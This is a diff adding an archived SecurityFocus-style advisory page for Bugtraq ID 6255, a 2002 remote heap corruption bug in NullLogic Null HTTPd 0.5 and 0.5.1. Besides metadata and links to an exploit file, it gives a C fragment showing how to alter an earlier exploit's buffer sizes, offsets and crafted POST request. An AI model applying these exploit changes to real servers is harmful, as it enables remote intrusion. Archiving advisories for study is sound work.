@@ -1,0 +1,99 @@
+#SpeeDr00t@Black Falcon<br>#bid6255<p><b><span style="font-size: 18pt;">Null HTTPD Remote Heap Corruption Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/6255/info">info</a><br><a href="http://www.securityfocus.com/bid/6255/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/6255/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/6255/solution">solution</a><br><a href="http://www.securityfocus.com/bid/6255/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				6255
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 26 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 26 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this vulnerability is credited to Shuo Chen &lt;shuochen@crhc.uiuc.edu&gt; and Jun Xu.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					NullLogic Null HTTPd 0.5.1 <br/>
+					
+				
+					NullLogic Null HTTPd 0.5 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x7000/6255/nullhttpd.c">#exploit_nullhttpd.c</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	A modification of the netric exploit, available for the vulnerability in BID 5774, has been released.<br/><br/>The following modification must be made to the referenced exploit:<br/><br/> int exploit(....)<br/>{       char sendbuf1500;  /*char sendbuf500;*/<br/>        char buffer1377;   /*char buffer377*/<br/>        .....<br/>        for(i=0;i&lt;1376;i=i+4) /*for(i=0;i&lt;376;i=i+4) */<br/>        {<br/>        ...<br/>        }<br/>        i = 1032;       /* i = 224; */<br/>        ...<br/>        buffer1376 = 0x0;     /* buffer376 = 0x0;*/<br/><br/>        snprintf(sendbuf, sizeof(sendbuf) -1, "POST / HTTP/1.0\n"<br/><br/>                "Content-Length: 8\n" /*"Content-Length: -800\n"*/<br/>                "\n%s\n",buffer);<br/>        ...<br/>}
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/nullhttpd.c">/data/vulnerabilities/exploits/nullhttpd.c</a></li>
+</ul>
+</div>
